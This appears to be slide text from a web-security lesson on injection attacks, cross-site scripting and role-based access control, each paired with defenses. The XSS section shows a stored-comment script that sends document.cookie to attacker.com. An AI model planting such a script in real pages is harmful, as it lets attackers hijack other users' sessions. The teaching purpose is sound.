Injection Attacks

Malicious users input code or commands through valid input fields

Common Types:

  • SQL Injection: Inserting SQL commands into form fields
  • Buffer Overflow: Exceeding memory boundaries
  • Command Injection: Executing system commands

Defense:

  • Input validation and sanitization
  • Parameterized queries
  • Least privilege principle

Result: Attacker bypasses authentication and gains admin access!

Cross-Site Scripting (XSS)

Injecting malicious JavaScript into web pages viewed by other users

1. Inject

Attacker adds malicious script to website

2. Store

Script saved in database or page

3. Execute

Script runs in victim's browser

4. Steal

Data sent to attacker

XSS Attack Example

// Attacker posts this comment:
<script>
  // Steal session cookie
  var cookie = document.cookie;
  var img = new Image();
  img.src = "http://attacker.com/steal?data=" + cookie;
</script>

// When other users view the comment:
// Their cookies are sent to the attacker!

Prevention:

  • HTML entity encoding
  • Content Security Policy (CSP)
  • Input validation

Authorization: What Can You Do?

Controlling access to resources based on authenticated identity

// Role-Based Access Control (RBAC)
if (user.role === 'admin') {
    // Full access
    allowAllOperations();
} else if (user.role === 'editor') {
    // Read and write access
    allowReadWrite();
} else if (user.role === 'viewer') {
    // Read-only access
    allowReadOnly();
} else {
    // No access
    denyAccess();
}
